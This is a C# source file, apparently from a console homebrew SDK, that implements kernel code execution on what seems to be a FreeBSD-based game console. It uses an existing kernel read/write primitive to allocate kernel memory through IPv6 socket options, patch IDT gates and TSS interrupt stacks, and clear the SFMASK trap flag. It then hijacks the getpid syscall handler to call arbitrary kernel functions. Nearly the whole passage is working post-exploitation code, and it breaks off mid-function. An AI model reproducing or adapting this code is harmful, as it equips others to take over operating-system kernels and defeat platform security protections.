// SharpProspero - a C# SDK for on-device application modules.
// Copyright (C) 2026 SvenGDK

using System.Runtime.InteropServices;

namespace SharpProspero.Payload.Kernel;

/// <summary>
/// Kernel function caller using the kernel trace mechanism: single-step tracing via
/// EFLAGS.TF, with INT 1 returning to a userspace <c>ret2trace</c> handler that
/// intercepts the <c>SYS_getpid</c> kernel handler, replaces registers with the
/// target function and arguments, then untraces so the target runs at full speed.
/// </summary>
public static unsafe partial class PayloadKfncall
{
    private const int Ncpus = 16;
    private const int TssStride = 0x68;
    private const int SysentSize = 48;
    private const int SyCallOffset = 8;
    private const int SysGetpid = 20;
    private const int SysSetsockopt = 105;
    private const int IpprotoIpv6 = 41;
    private const int Ipv6Rthdr = 51;

    // Kernel structure offsets for the victim socket walk.
    private const int FdOfilesOffset = 0;
    private const int FdEntryBase = 8;
    private const int FdEntryStride = 48;
    private const int FileDataOffset = 0;
    private const int SocketPcbOffset = 24;
    private const int InpcbOutputoptsOffset = 288;

    // ---- State ----
    private static bool s_setupDone;
    private static byte[] s_idt1Gate;
    private static byte[] s_origIdt1Gate;
    private static byte[] s_idt9Gate;
    private static byte[] s_origIdt9Gate;
    private static byte[] s_idt179Gate;
    private static byte[] s_origIdt179Gate;
    private static ulong s_idtBase;
    private static int s_pinnedCpu;
    private static ulong s_gadgetStack;
    private static ulong s_kframeKva;
    private static ulong s_uretframeKva;
    private static ulong s_kstack;
    // Original TSS IST3/IST4/IST6 values for the pinned CPU, captured before
    // Setup overwrites them with gadget-stack offsets. Cleanup restores these
    // so the pinned CPU regains its native interrupt-stack layout when the
    // installer is unloaded or setup fails partway.
    private static ulong s_origIst3;
    private static ulong s_origIst4;
    private static ulong s_origIst6;
    // Original SFMASK MSR value (with the TF bit) captured during Setup so
    // Cleanup can restore the kernel's original syscall-flag mask.
    private static ulong s_origSfmask;
    private static bool s_origSfmaskCaptured;
    private static ulong s_doretiIret;
    private static ulong s_nopRet;
    private static ulong s_cpuSwitch;
    private static ulong s_syscallAfter;
    private static ulong s_sysGetpidHandler;
    private static ulong[] s_uretframeForTrace = new ulong[5];


    /// <summary>
    /// Performs the one-time setup matching the one-time kernel-trace setup + the trace ring-buffer install:
    /// allocates the gadget stack, patches IDT/TSS, sets up the trace
    /// infrastructure. Must be called before the first <see cref="Call"/>.
    /// </summary>
    public static bool Setup(PayloadKernelIo io, uint fw)
    {
        if (s_setupDone) return true;

        PayloadArgs* pargs = PayloadEntryPoint.Args;
        if (pargs == null) return false;

        ulong kdb = pargs->KernelDataBase;
        if (kdb == 0) return false;

        PayloadCrt.Klog("sp:kfn:setup\n\0"u8);

        // ---- Pipe reinit: create a fresh pipe and walk kernel for rpipe ----
        // The original pipe pair (latched by kernel_init from the loader args) may
        // have been closed or its kernel-side rpipe freed. Create a fresh pipe and
        // walk the kernel file-descriptor table to find the new rpipe address, then
        // update the CRT BSS globals so kernel_write/kernel_copyout use the new pair.
        {
            int* fds = stackalloc int[2];
            CrtPipe(fds);
            int newReadFd = fds[0];
            int newWriteFd = fds[1];

            int ourPid = Process.PayloadProcessControl.getpid();
            ulong proc = PayloadKernel.WalkAllprocForPid(io, ourPid);
            if (proc == 0) { PayloadCrt.Klog("sp:kfn:pipe:proc:fail\n\0"u8); return false; }

            ulong filedesc = io.ReadU64(proc + KernelOffsets.ProcFd);
            if (filedesc == 0) { PayloadCrt.Klog("sp:kfn:pipe:fd:fail\n\0"u8); return false; }

            ulong ofiles = io.ReadU64(filedesc + FdOfilesOffset);
            if (ofiles == 0) { PayloadCrt.Klog("sp:kfn:pipe:ofiles:fail\n\0"u8); return false; }

            ulong readFile = io.ReadU64(ofiles + FdEntryBase + (ulong)newReadFd * FdEntryStride);
            if (readFile == 0) { PayloadCrt.Klog("sp:kfn:pipe:file:fail\n\0"u8); return false; }

            ulong rpipe = io.ReadU64(readFile + FileDataOffset);
            if (rpipe == 0) { PayloadCrt.Klog("sp:kfn:pipe:data:fail\n\0"u8); return false; }

            CrtPipeReinit(rpipe, newReadFd, newWriteFd);
            PayloadCrt.Klog("sp:kfn:pipe:ok\n\0"u8);
        }

        // ---- Resolve absolute kernel addresses ----
        s_doretiIret = Abs(kdb, KernelOffsets.DoretiIret_1001);
        s_nopRet = Abs(kdb, KernelOffsets.NopRet_1001);
        s_cpuSwitch = Abs(kdb, KernelOffsets.CpuSwitch_1001);
        s_syscallAfter = Abs(kdb, KernelOffsets.SyscallAfter_1001);
        ulong addRspIret = Abs(kdb, KernelOffsets.AddRspIret_1001);
        ulong idtBase = Abs(kdb, KernelOffsets.Idt_1001);
        s_idtBase = idtBase;
        ulong tssBase = Abs(kdb, KernelOffsets.TssArray_1001);
        ulong repMovsbPopRbpRet = Abs(kdb, KernelOffsets.RepMovsbPopRbpRet_1001);

        // ---- Step 1: Allocate gadget_stack (2048 bytes) via setsockopt ----
        int victimFd = pargs->RwPair[1];
        if (victimFd <= 0) return false;

        ulong pktopts = FindVictimPktopts(io, pargs, victimFd);
        if (pktopts == 0) { PayloadCrt.Klog("sp:kfn:pktopts:fail\n\0"u8); return false; }

        ulong gadgetStack = KmallocViaRthdr(io, victimFd, pktopts, 2048);
        if (gadgetStack == 0) { PayloadCrt.Klog("sp:kfn:alloc:fail\n\0"u8); return false; }
        s_gadgetStack = gadgetStack;
        PayloadCrt.Klog("sp:kfn:alloc:ok\n\0"u8);

        // ---- Step 2: Pin CPU, then patch TSS IST on ALL 16 CPUs ----
        // IDT is global (shared across all CPUs) but TSS IST is per-CPU.
        // Both MUST be consistent: if IDT[1] uses IST=4 pointing to our handler,
        // IST4 on EVERY CPU must point to our gadget_stack or the handler will
        // read garbage and crash. This matches the one-time kernel-trace setup which patches all CPUs.
        {
            long* tidBuf = stackalloc long[1];
            PayloadCrt.Syscall(432 /* SYS_thr_self */, (long)(nint)tidBuf);
            int tid = (int)*tidBuf;

            byte* affinity = stackalloc byte[16];
            PayloadCrt.Syscall(487 /* SYS_cpuset_getaffinity */,
                3 /* CPU_LEVEL_WHICH */, 1 /* CPU_WHICH_TID */, tid, 16, (long)(nint)affinity);

            int firstByte = 0;
            while (firstByte < 16 && affinity[firstByte] == 0) firstByte++;
            byte firstBit = 0;
            if (firstByte < 16)
            {
                while ((affinity[firstByte] & (1 << firstBit)) == 0) firstBit++;
                s_pinnedCpu = firstByte * 8 + firstBit;
                new System.Span<byte>(affinity, 16).Clear();
                affinity[firstByte] = (byte)(1 << firstBit);
                PayloadCrt.Syscall(488 /* SYS_cpuset_setaffinity */,
                    3, 1, tid, 16, (long)(nint)affinity);
            }
        }
        PayloadCrt.Klog("sp:kfn:cpu:ok\n\0"u8);

        // Patch TSS IST entries on the PINNED CPU ONLY. Patching all 16 CPUs
        // corrupts other processes' interrupt stacks — any other CPU handling
        // an IST-switched interrupt would use our gadget_stack, causing GP faults
        // system-wide (SceShellUI crash in kstuffsharp54).
        byte* tssBlock = stackalloc byte[TssStride];

        // Use gadget_stack + 0x700 as the kernel stack for RunInKernel.
        // The original uses percpu_ist4[13] - 0x28, but rdmsr_start is a large
        // function that writes to [rsp+0xC8] etc. IST4 - 0x28 only provides 0x28
        // bytes of stack, which overflows into unmapped memory. Our gadget_stack
        // is 2048 bytes — offset 0x700 gives plenty of space in both directions.
        s_kstack = gadgetStack + 0x700;

        // Patch TSS IST entries on the PINNED CPU ONLY. Capture the originals
        // first so Cleanup() can restore the kernel's native IST layout when
        // Setup fails partway or the installer is unloaded.
        {
            int cpu = s_pinnedCpu;
            ulong tss = tssBase + (ulong)(cpu * TssStride);
            io.Read(tss, tssBlock, TssStride);
            s_origIst3 = *(ulong*)(tssBlock + 0x34);
            s_origIst4 = *(ulong*)(tssBlock + 0x3c);
            s_origIst6 = *(ulong*)(tssBlock + 0x4c);
            *(ulong*)(tssBlock + 0x34) = gadgetStack + 0xe0;
            *(ulong*)(tssBlock + 0x3c) = gadgetStack + 0x1f0;
            *(ulong*)(tssBlock + 0x4c) = gadgetStack + 0x440;
            io.Write(tss, tssBlock, TssStride);
        }

        s_kframeKva = gadgetStack + 0x1c8;
        s_uretframeKva = gadgetStack + 0x2b0;

        PayloadCrt.Klog("sp:kfn:tss:ok\n\0"u8);

        // ---- Step 3: Write trampoline frame at gadget_stack+0x1a0 ----
        // This chains INT9 → doreti_iret → kframe.
        io.WriteU64(gadgetStack + 0x1a0, s_doretiIret);
        io.WriteU64(gadgetStack + 0x1a8, 0x20);         // CS = kernel
        io.WriteU64(gadgetStack + 0x1b0, 2);             // EFLAGS (IF cleared, TF cleared)
        io.WriteU64(gadgetStack + 0x1b8, s_kframeKva);   // RSP → kframe
        io.WriteU64(gadgetStack + 0x1c0, 0);             // SS = 0

        // ---- Step 4: Write INT179 frames ----
        // rep_movsb_pop_rbp_ret gadget chain.
        io.WriteU64(gadgetStack + 0x408, 0);
        io.WriteU64(gadgetStack + 0x410, s_doretiIret);
        io.WriteU64(gadgetStack + 0x500, repMovsbPopRbpRet);
        io.WriteU64(gadgetStack + 0x508, 0x20);
        io.WriteU64(gadgetStack + 0x510, 0x40002);
        io.WriteU64(gadgetStack + 0x518, gadgetStack + 0x408);
        io.WriteU64(gadgetStack + 0x520, 0);

        // ---- Step 5: Patch IDT gates ----
        byte* gate = stackalloc byte[16];

        // Save original IDT handler addresses before patching.
        OriginalInt1Handler = KernelIdt.ReadGateTarget(io, idtBase, 1);
        OriginalInt3Handler = KernelIdt.ReadGateTarget(io, idtBase, 3);
        OriginalInt13Handler = KernelIdt.ReadGateTarget(io, idtBase, 13);

        // IDT[1] is patched per-call in Call(), NOT here. Stray INT1 between
        // Setup() and Call() would enter the trace handler (add_rsp_iret) which
        // skips 8 bytes from the interrupt frame — correct for the trace cycle's
        // custom frame but WRONG for normal INT1 (no error code). This corrupts
        // the return frame and zeros registers.
        BuildIdtGate(gate, addRspIret, 0x20, 4, 0x8E);
        s_idt1Gate = new byte[16];
        for (int j = 0; j < 16; j++) s_idt1Gate[j] = gate[j];
        // Save original IDT[1] for restore after Call()
        s_origIdt1Gate = new byte[16];
        fixed (byte* origGate = s_origIdt1Gate)
            io.Read(idtBase + 1 * 16, origGate, 16);

        // IDT[9] and IDT[179] are also patched per-use, like IDT[1].
        // Patching them in Setup() leaves a window where kernel interrupts on
        // the pinned CPU can use the modified IST3/IST6, corrupting gadget_stack.
        BuildIdtGate(gate, addRspIret, 0x20, 3, 0xEE);
        s_idt9Gate = new byte[16];
        for (int j = 0; j < 16; j++) s_idt9Gate[j] = gate[j];
        s_origIdt9Gate = new byte[16];
        fixed (byte* origGate9 = s_origIdt9Gate)
            io.Read(idtBase + 9 * 16, origGate9, 16);

        BuildIdtGate(gate, addRspIret, 0x20, 6, 0xEE);
        s_idt179Gate = new byte[16];
        for (int j = 0; j < 16; j++) s_idt179Gate[j] = gate[j];
        s_origIdt179Gate = new byte[16];
        fixed (byte* origGate179 = s_origIdt179Gate)
            io.Read(idtBase + 179 * 16, origGate179, 16);

        PayloadCrt.Klog("sp:kfn:idt:ok\n\0"u8);

        // ---- Step 6: Allocate 16KB trace stack (mmap + mlock) ----
        long stackAddr = PayloadCrt.Syscall(477 /* SYS_mmap */, 0,
            16384, 3 /* PROT_READ|PROT_WRITE */, 0x1002 /* PRIVATE|ANON */, -1, 0);
        if (stackAddr <= 0) { PayloadCrt.Klog("sp:kfn:stack:fail\n\0"u8); return false; }
        byte* traceStack = (byte*)stackAddr;
        traceStack[0] = 1; // touch page
        PayloadCrt.Syscall(203 /* SYS_mlock */, stackAddr, 16384);

        // ---- Step 7: Build uretframe_for_trace ----
        // Points to ret2trace in userspace with the mmap'd stack.
        // Resolve ret2trace address via CRT helper (not dlsym, which can't find
        // CRT symbols because they're resolved at link time, not in .dynsym).
        nint ret2traceAddr = CrtGetRet2trace();
        if (ret2traceAddr == 0) { PayloadCrt.Klog("sp:kfn:ret2trace:fail\n\0"u8); return false; }

        s_uretframeForTrace[0] = (ulong)ret2traceAddr;
        s_uretframeForTrace[1] = 0x43;   // CS = user code 64-bit
        s_uretframeForTrace[2] = 2;       // EFLAGS: reserved bit only (IF=0, TF=0)
        s_uretframeForTrace[3] = (ulong)(nint)(traceStack + 16384); // RSP = top of stack
        s_uretframeForTrace[4] = 0x3b;   // SS = user data

        // Copy uretframe_for_trace to kernel uretframe.
        fixed (ulong* urf = s_uretframeForTrace)
            io.Write(s_uretframeKva, (byte*)urf, 40);

        PayloadCrt.Klog("sp:kfn:trace:ok\n\0"u8);

        // ---- Step 8: Set CRT BSS globals via DirectPInvoke helper ----
        // CRT BSS symbols are not in .dynsym (link-time resolution only), so we
        // use the CRT's __sp_trace_init function to write all 6 globals at once.
        CrtTraceInit(s_kframeKva, s_uretframeKva, 0, 0, 0, 168);

        PayloadCrt.Klog("sp:kfn:bss:ok\n\0"u8);

        // ---- Step 9: Clear SFMASK TF bit via run_in_kernel ----
        // SFMASK (MSR 0xC0000084) controls which EFLAGS bits SYSCALL clears on entry.
        // FreeBSD sets TF (bit 8) in SFMASK, so SYSCALL clears TF. We must clear
        // the TF bit from SFMASK so TF survives into the kernel for tracing.
        // This uses CrtRunInKernel (INT 9 based kernel execution) which does NOT
        // require the trace mechanism to be working yet — it's the bootstrap path,
        // matches the pattern: wrmsr(0xc0000084, rdmsr(0xc0000084) & -0x101).
        ulong rdmsrStart = Abs(kdb, KernelOffsets.RdmsrStart_1001);
        ulong wrmsrRet = Abs(kdb, KernelOffsets.WrmsrRet_1001);

        PayloadCrt.Klog("sp:kfn:sfmask:start\n\0"u8);

        // Patch IDT[1] and IDT[9] for the run_in_kernel mechanism.
        // IDT[9]: INT 9 fires from run_in_kernel to enter the trampoline chain.
        // IDT[1]: RFLAGS = 0x102 (TF + reserved) causes INT 1 after each kernel
        // instruction. INT 1 saves post-instruction state to kframe (via IST4
        // frame push at gadgetStack+0x1c8) then add_rsp_iret chains to uretframe
        // (gadgetStack+0x2b0), returning to .int1_return in userspace. Without
        // IDT[1] patched, INT 1 goes to the kernel's default debug handler.
        fixed (byte* g1 = s_idt1Gate)
            io.Write(s_idtBase + 1 * 16, g1, 16);
        fixed (byte* g9 = s_idt9Gate)
            io.Write(s_idtBase + 9 * 16, g9, 16);

        // Pre-seed kframe and uretframe via the pipe-based io.Write primitive
        // (proven working on this device) so the doreti_iret trampoline chain
        // has valid IRETQ operands even if the CRT's internal copyin inside
        // __sp_run_in_kernel silently fails. The kframe drives the INT 9 entry
        // into kernel mode (RIP=rdmsrStart/wrmsrRet, CS=0x20, RFLAGS=0x102 with
        // TF for single-step, RSP=kstack, SS=0). The uretframe drives the
        // subsequent INT 1 return to userspace (RIP=.int1_return, CS=0x43,
        // RFLAGS=0x10202 with IF+RF+reserved -- RF suppresses INT 1 re-delivery
        // on the first .int1_return instruction, RSP=trace stack top).
        nint int1Return = CrtGetInt1Return();
        if (int1Return == 0) { PayloadCrt.Klog("sp:kfn:int1_return:fail\n\0"u8); return false; }

        ulong* uf = stackalloc ulong[5];
        uf[0] = (ulong)int1Return;
        uf[1] = 0x43;
        uf[2] = 0x10202;
        uf[3] = s_uretframeForTrace[3];
        uf[4] = 0x3b;
        io.Write(s_uretframeKva, (byte*)uf, 40);

        ulong* kf = stackalloc ulong[5];
        kf[1] = 0x20;
        kf[2] = 0x102;
        kf[3] = s_kstack;
        kf[4] = 0;

        // rdmsr: execute one RDMSR instruction in kernel mode.
        kf[0] = rdmsrStart;
        io.Write(s_kframeKva, (byte*)kf, 40);
        RunInKernelRegs* regs = stackalloc RunInKernelRegs[1];
        *regs = default;
        regs->rip = rdmsrStart;
        regs->rcx = 0xC0000084;
        regs->eflags = 0x102;       // TF=1: single-step, execute ONE instruction
        regs->rsp = s_kstack;
        CrtRunInKernel(regs);

        ulong sfmask = regs->rax | (regs->rdx << 32);
        // Capture the original SFMASK before we mask off the TF bit; Cleanup
        // uses this to restore the kernel's native syscall-flag mask.
        s_origSfmask = sfmask;
        s_origSfmaskCaptured = true;
        sfmask &= unchecked((ulong)(-0x101L));

        // wrmsr: write modified SFMASK (clears TF and IF mask bits). Re-write
        // the kframe with the wrmsr entry point; re-write the uretframe in
        // case any intervening kernel work clobbered it.
        kf[0] = wrmsrRet;
        io.Write(s_kframeKva, (byte*)kf, 40);
        io.Write(s_uretframeKva, (byte*)uf, 40);
        *regs = default;
        regs->rip = wrmsrRet;
        regs->rcx = 0xC0000084;
        regs->rax = sfmask & 0xFFFFFFFF;
        regs->rdx = sfmask >> 32;
        regs->eflags = 0x102;       // TF=1: single-step, execute ONE instruction
        regs->rsp = s_kstack;
        CrtRunInKernel(regs);

        // Restore original IDT[1] and IDT[9].
        fixed (byte* og1 = s_origIdt1Gate)
            io.Write(s_idtBase + 1 * 16, og1, 16);
        fixed (byte* og9 = s_origIdt9Gate)
            io.Write(s_idtBase + 9 * 16, og9, 16);

        PayloadCrt.Klog("sp:kfn:sfmask:ok\n\0"u8);

        // ---- Step 10: Install SIGTRAP handler (matches the trace-instrument pattern) ----
        // Uses CRT assembly handler (__sp_clear_tf_handler) instead of a managed
        // [UnmanagedCallersOnly] callback. NativeAOT's reverse P/Invoke GC transition
        // crashes when the signal fires with kernel addresses in registers (left over
        // from the kfncall trace cycle). The CRT handler is pure assembly: no GC, no
        // managed state — just `and qword [rdx+240], -257; ret`.
        {
            byte* sa = stackalloc byte[32];
            new System.Span<byte>(sa, 32).Clear();
            *(nint*)sa = CrtGetClearTfHandler();
            *(int*)(sa + 8) = 0x40; // SA_SIGINFO
            PayloadCrt.Syscall(416 /* SYS_sigaction */, 5 /* SIGTRAP */, (long)(nint)sa, 0);
        }
        PayloadCrt.Klog("sp:kfn:sigtrap:ok\n\0"u8);

        // ---- Step 11: Initialise CRT fncall BSS globals ----
        // Use individual setters (≤7 params, all in registers) instead of
        // CrtFncallInit (13 params, 7 on stack) which crashes — NativeAOT's
        // stack layout for >6 P/Invoke params doesn't match the CRT's
        // [rbp+16..64] expectations.
        CrtSetFncallArgs(0, 0, 0, 0, 0, 0, 0);
        CrtFncallInitCore(s_cpuSwitch, s_sysGetpidHandler, s_syscallAfter,
            s_nopRet, s_doretiIret);
        PayloadCrt.Klog("sp:kfn:fncall_init:ok\n\0"u8);

        s_setupDone = true;
        PayloadCrt.Klog("sp:kfn:setup:ok\n\0"u8);
        return true;
    }

    /// <summary>
    /// Executes a single-instruction kernel gadget with explicit control over
    /// <c>RAX</c>. Some gadgets consume their input from <c>RAX</c> rather than
    /// the AMD64 argument registers (for example, <c>mov cr3, rax</c>). The
    /// standard <see cref="Call"/> path routes arguments through the trace
    /// callback's shared BSS globals, which land in <c>RDI</c> / <c>RSI</c> /
    /// <c>RDX</c> / <c>RCX</c> / <c>R8</c> / <c>R9</c> and never touch <c>RAX</c>;
    /// this method uses the single-step dispatch chain (INT 9 with the trace
    /// gates + a pre-seeded kframe) which does honour every field of
    /// <see cref="RunInKernelRegs"/>.
    /// </summary>
    /// <param name="io">Kernel I/O.</param>
    /// <param name="gadgetAddr">Kernel virtual address of the target gadget.</param>
    /// <param name="raxIn">Value to load into RAX before the gadget executes.</param>
    /// <returns>The RAX value after the gadget returns, or zero when the setup
    /// state is not resident and the call has to be refused.</returns>
    public static ulong RunGadgetWithRax(PayloadKernelIo io, ulong gadgetAddr, ulong raxIn)
    {
        if (!s_setupDone) return 0;
        if (gadgetAddr == 0) return 0;

        // Guard against the post-install case where the kelf installer has
        // overwritten TSS IST3/IST4 with kelf offsets. Our INT 9 / INT 1 chain
        // still points at the setup-time gadget_stack; running with an alien
        // IST4 would push the interrupt frame at an unrelated kernel stack
        // and IRETQ from garbage into ring 0.
        PayloadArgs* pargs = PayloadEntryPoint.Args;
        if (pargs == null) return 0;
        ulong tssBase = Abs(pargs->KernelDataBase, KernelOffsets.TssArray_1001);
        ulong currentIst4 = io.ReadU64(tssBase + (ulong)(s_pinnedCpu * TssStride) + 0x3c);
        if (currentIst4 != s_gadgetStack + 0x1f0) return 0;

        // Arm the trace IDT gates, seed the return frames, run one instruction
        // of gadget code, then put the IDT gates back.
        fixed (byte* g1 = s_idt1Gate)
            io.Write(s_idtBase + 1 * 16, g1, 16);
        fixed (byte* g9 = s_idt9Gate)
            io.Write(s_idtBase + 9 * 16, g9, 16);

        nint int1Return = CrtGetInt1Return();
        if (int1Return == 0)
        {
            fixed (byte* og1 = s_origIdt1Gate)
                io.Write(s_idtBase + 1 * 16, og1, 16);
            fixed (byte* og9 = s_origIdt9Gate)
                io.Write(s_idtBase + 9 * 16, og9, 16);
            return 0;
        }

        ulong* uf = stackalloc ulong[5];
        uf[0] = (ulong)int1Return;
        uf[1] = 0x43;
        uf[2] = 0x10202;
        uf[3] = s_uretframeForTrace[3];
        uf[4] = 0x3b;
        io.Write(s_uretframeKva, (byte*)uf, 40);

        ulong* kf = stackalloc ulong[5];
        kf[0] = gadgetAddr;
        kf[1] = 0x20;
        kf[2] = 0x102;
        kf[3] = s_kstack;
        kf[4] = 0;
        io.Write(s_kframeKva, (byte*)kf, 40);

        RunInKernelRegs* regs = stackalloc RunInKernelRegs[1];
        *regs = default;
        regs->rip = gadgetAddr;
        regs->rax = raxIn;
        regs->eflags = 0x102;
        regs->rsp = s_kstack;
        CrtRunInKernel(regs);

        ulong raxOut = regs->rax;

        fixed (byte* og1 = s_origIdt1Gate)
            io.Write(s_idtBase + 1 * 16, og1, 16);
        fixed (byte* og9 = s_origIdt9Gate)
            io.Write(s_idtBase + 9 * 16, og9, 16);
        return raxOut;
    }

    /// <summary>
    /// Writes a model-specific register in kernel context by executing a single
    /// <c>wrmsr</c> instruction under the trace-mode dispatch chain used during
    /// <see cref="Setup(PayloadKernelIo, uint)"/>. Requires the setup state
    /// (gadget stack, kframe/uretframe, IDT gates) to be resident; callers that
    /// need to mutate MSRs after <see cref="Cleanup(PayloadKernelIo)"/> must
    /// re-run <see cref="Setup(PayloadKernelIo, uint)"/> first.
    /// </summary>
    /// <param name="io">Kernel I/O.</param>
    /// <param name="msr">MSR number (e.g. <c>0xC0000084</c> for <c>SFMASK</c>).</param>
    /// <param name="value">64-bit value to write; the CPU consumes it as EDX:EAX.</param>
    /// <returns><see langword="true"/> on success. <see langword="false"/> when
    /// setup is not complete or the wrmsr_ret gadget offset is unresolved.</returns>
    public static bool WriteMsr(PayloadKernelIo io, uint msr, ulong value)
    {
        if (!s_setupDone) return false;

        PayloadArgs* pargs = PayloadEntryPoint.Args;
        if (pargs == null || pargs->KernelDataBase == 0) return false;
        ulong wrmsrRet = Abs(pargs->KernelDataBase, KernelOffsets.WrmsrRet_1001);
        if (wrmsrRet == 0) return false;

        // Guard against the post-install case where the kelf installer has
        // overwritten TSS IST3/IST4 on every CPU with the kelf's own values.
        // s_setupDone stays true across install, but the IST slots our INT 9
        // and INT 1 gates rely on no longer point at gadgetStack, so firing
        // the trace chain here would push the interrupt frame at the kelf's
        // stack and IRETQ from garbage into ring 0. Fail cleanly instead.
        ulong tssBase = Abs(pargs->KernelDataBase, KernelOffsets.TssArray_1001);
        ulong currentIst4 = io.ReadU64(tssBase + (ulong)(s_pinnedCpu * TssStride) + 0x3c);
        if (currentIst4 != s_gadgetStack + 0x1f0) return false;

        // Arm IDT[1]/[9] for the single-step dispatch, seed the kernel and user
        // return frames, run one wrmsr instruction, then restore the IDT gates.
        fixed (byte* g1 = s_idt1Gate)
            io.Write(s_idtBase + 1 * 16, g1, 16);
        fixed (byte* g9 = s_idt9Gate)
            io.Write(s_idtBase + 9 * 16, g9, 16);

        nint int1Return = CrtGetInt1Return();
        if (int1Return == 0)
        {
            fixed (byte* og1 = s_origIdt1Gate)
                io.Write(s_idtBase + 1 * 16, og1, 16);
            fixed (byte* og9 = s_origIdt9Gate)
                io.Write(s_idtBase + 9 * 16, og9, 16);
            return false;
        }

        ulong* uf = stackalloc ulong[5];
        uf[0] = (ulong)int1Return;
        uf[1] = 0x43;
        uf[2] = 0x10202;
        uf[3] = s_uretframeForTrace[3];
        uf[4] = 0x3b;
        io.Write(s_uretframeKva, (byte*)uf, 40);

        ulong* kf = stackalloc ulong[5];
        kf[0] = wrmsrRet;
        kf[1] = 0x20;
        kf[2] = 0x102;
        kf[3] = s_kstack;
        kf[4] = 0;
        io.Write(s_kframeKva, (byte*)kf, 40);

        RunInKernelRegs* regs = stackalloc RunInKernelRegs[1];
        *regs = default;
        regs->rip = wrmsrRet;
        regs->rcx = msr;
        regs->rax = value & 0xFFFFFFFF;
        regs->rdx = value >> 32;
        regs->eflags = 0x102;
        regs->rsp = s_kstack;
        CrtRunInKernel(regs);

        fixed (byte* og1 = s_origIdt1Gate)
            io.Write(s_idtBase + 1 * 16, og1, 16);
        fixed (byte* og9 = s_origIdt9Gate)
            io.Write(s_idtBase + 9 * 16, og9, 16);
        return true;
    }

    /// <summary>
    /// Reverses the mutations performed by <see cref="Setup(PayloadKernelIo, uint)"/>:
    /// restores the original IDT[1]/IDT[9]/IDT[179] gate bytes, the pinned CPU's
    /// TSS IST3/IST4/IST6 entries, and the SFMASK MSR. Safe to call on a partial
    /// setup: only state that was actually captured is written back.
    /// </summary>
    /// <remarks>
    /// Callers can wind back the kernel-facing changes when a later install step
    /// fails, or when a diagnostic build needs to leave the console in its pre-
    /// install state after collecting evidence.
    /// </remarks>
    public static void Cleanup(PayloadKernelIo io)
    {
        if (!s_setupDone) return;

        // Restore IDT gates. These are captured verbatim, so a direct pipe write
        // is enough — no re-encoding needed.
        if (s_origIdt1Gate != null)
            fixed (byte* g = s_origIdt1Gate)
                io.Write(s_idtBase + 1 * 16, g, 16);
        if (s_origIdt9Gate != null)
            fixed (byte* g = s_origIdt9Gate)
                io.Write(s_idtBase + 9 * 16, g, 16);
        if (s_origIdt179Gate != null)
            fixed (byte* g = s_origIdt179Gate)
                io.Write(s_idtBase + 179 * 16, g, 16);

        PayloadArgs* pargs = PayloadEntryPoint.Args;

        // Restore SFMASK MSR BEFORE putting TSS IST back. The wrmsr goes through
        // the trace dispatch chain, which fires INT 9 (IST index 3) and INT 1
        // (IST index 4). Those interrupts rely on TSS IST3/IST4 still pointing
        // at gadget_stack; restoring the TSS first would send the interrupt
        // frames to the kernel's original debug stacks and IRETQ from garbage.
        if (s_origSfmaskCaptured)
        {
            ulong wrmsrRet = Abs(pargs != null ? pargs->KernelDataBase : 0,
                KernelOffsets.WrmsrRet_1001);
            fixed (byte* g1 = s_idt1Gate)
                io.Write(s_idtBase + 1 * 16, g1, 16);
            fixed (byte* g9 = s_idt9Gate)
                io.Write(s_idtBase + 9 * 16, g9, 16);

            nint int1Return = CrtGetInt1Return();
            if (int1Return != 0)
            {
                ulong* uf = stackalloc ulong[5];
                uf[0] = (ulong)int1Return;
                uf[1] = 0x43;
                uf[2] = 0x10202;
                uf[3] = s_uretframeForTrace[3];
                uf[4] = 0x3b;
                io.Write(s_uretframeKva, (byte*)uf, 40);

                ulong* kf = stackalloc ulong[5];
                kf[0] = wrmsrRet;
                kf[1] = 0x20;
                kf[2] = 0x102;
                kf[3] = s_kstack;
                kf[4] = 0;
                io.Write(s_kframeKva, (byte*)kf, 40);

                RunInKernelRegs* regs = stackalloc RunInKernelRegs[1];
                *regs = default;
                regs->rip = wrmsrRet;
                regs->rcx = 0xC0000084;
                regs->rax = s_origSfmask & 0xFFFFFFFF;
                regs->rdx = s_origSfmask >> 32;
                regs->eflags = 0x102;
                regs->rsp = s_kstack;
                CrtRunInKernel(regs);
            }

            fixed (byte* og1 = s_origIdt1Gate)
                io.Write(s_idtBase + 1 * 16, og1, 16);
            fixed (byte* og9 = s_origIdt9Gate)
                io.Write(s_idtBase + 9 * 16, og9, 16);
        }

        // Restore the pinned CPU's TSS IST slots LAST. Reading the block first
        // lets us leave every other TSS field the kernel wrote after Setup intact.
        if (pargs != null)
        {
            ulong tssBase = Abs(pargs->KernelDataBase, KernelOffsets.TssArray_1001);
            byte* tssBlock = stackalloc byte[TssStride];
            ulong tss = tssBase + (ulong)(s_pinnedCpu * TssStride);
            io.Read(tss, tssBlock, TssStride);
            *(ulong*)(tssBlock + 0x34) = s_origIst3;
            *(ulong*)(tssBlock + 0x3c) = s_origIst4;
            *(ulong*)(tssBlock + 0x4c) = s_origIst6;
            io.Write(tss, tssBlock, TssStride);
        }

        s_setupDone = false;
        PayloadCrt.Klog("sp:kfn:cleanup:ok\n\0"u8);
    }

    /// <summary>
    /// Calls an arbitrary kernel function via the kernel trace mechanism.
    /// Sets the trace callback, enables single-step tracing, calls getpid
    /// to enter the kernel, and returns the captured result.
    /// </summary>
    public static ulong Call(PayloadKernelIo io, ulong sysentsAddr, ulong kfnAddr,
        ulong arg1 = 0, ulong arg2 = 0, ulong arg3 = 0,
        ulong arg4 = 0, ulong arg5 = 0, ulong arg6 = 0)
    {
        if (!s_setupDone) return 0;

        // Set function and arguments in CRT BSS (replaces managed statics).
        CrtSetFncallArgs(kfnAddr, arg1, arg2, arg3, arg4, arg5, arg6);

        // Set trace callback to the CRT assembly __sp_getpid_to_fncall.
        CrtTraceSetProg(CrtGetFncallCallback());

        // Read sys_getpid handler address (one-time) and update the CRT BSS.
        if (s_sysGetpidHandler == 0)
        {
            PayloadCrt.Klog("sp:kfn:call:first\n\0"u8);
            ulong entryBase = sysentsAddr + SysGetpid * SysentSize;
            s_sysGetpidHandler = io.ReadU64(entryBase + SyCallOffset);
            if (s_sysGetpidHandler == 0)
            {
                PayloadCrt.Klog("sp:kfn:call:getpid:fail\n\0"u8);
                CrtTraceSetProg(0);
                return 0;
            }
            // Update the BSS globals so the CRT callback can see it.
            CrtFncallInitCore(s_cpuSwitch, s_sysGetpidHandler, s_syscallAfter,
                s_nopRet, s_doretiIret);
            CrtSetFncallArgs(kfnAddr, arg1, arg2, arg3, arg4, arg5, arg6);
